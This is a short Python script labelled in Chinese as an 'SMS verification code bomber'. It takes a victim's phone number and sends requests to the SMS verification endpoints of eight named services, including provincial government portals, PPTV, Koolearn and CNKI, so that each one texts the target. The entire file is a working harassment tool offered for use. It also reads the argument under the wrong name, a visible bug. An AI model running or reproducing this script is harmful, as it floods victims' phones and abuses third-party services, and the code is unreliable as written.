import argparse

import requests

# 定义手机号


parser = argparse.ArgumentParser(description="短信验证码轰炸")
parser.add_argument('-p', '--phone', type=str, help="手机号")
args = parser.parse_args()
phone_number = args.p
# 定义请求 URL 字典
urls = {
    "浙江省政务服务网": f"https://zxts.zjzwfw.gov.cn/sendMsg.do?modelMethod=sendMessage&phonenum={phone_number}",
    "游跑网": f"http://m.yupao.com/index/send-tel-code/$_csrf_m_decorate=jdZB_M9J_ke-rFjSLJutrQB3r_pRKeB1ekOJGCdISegvL0Tc9zETLuKIOAH9YmZRmZpPV-9heuv7vI0DBbQAbg==&tel={phone_number}&action=code-login&token=1318695695bc894ab42f942e5ca5a914&time=1623177811&rand=2&check=1&words=gEdnAh?",
    "青海省人力资源和社会保障厅": f"http://rst.qinghai.gov.cn/qhrst/sign/captcha?phoneNum={phone_number}",
    "PPTV": f"http://api.passport.pptv.com/checkImageCodeAndSendMsg?&scene=REG_PPTV_APP&deviceId=867830021000533&aliasName={phone_number}",
    "蚂蚁金服": f"http://mayi-api.91ants.com/shared/sms/code?mobile={phone_number}",
    "Daojia": f"http://user.daojia.com/mobile/getcode?mobile={phone_number}",
    "新东方在线": f"https://login.koolearn.com/sso/sendVoiceRegisterMessage.do?callback=jQuery111205661385064312077_1594952633553&type=jsonp&mobile={phone_number}",
    "中国知网商城": f"https://mall.cnki.net/uc/RegServer.ashx?t=1&key={phone_number}&v=0.9391179322518282"
}

# 循环发送请求并打印响应状态码
for service_name, url in urls.items():
    response = requests.get(url)
    print(f"响应状态码: {response.status_code}")
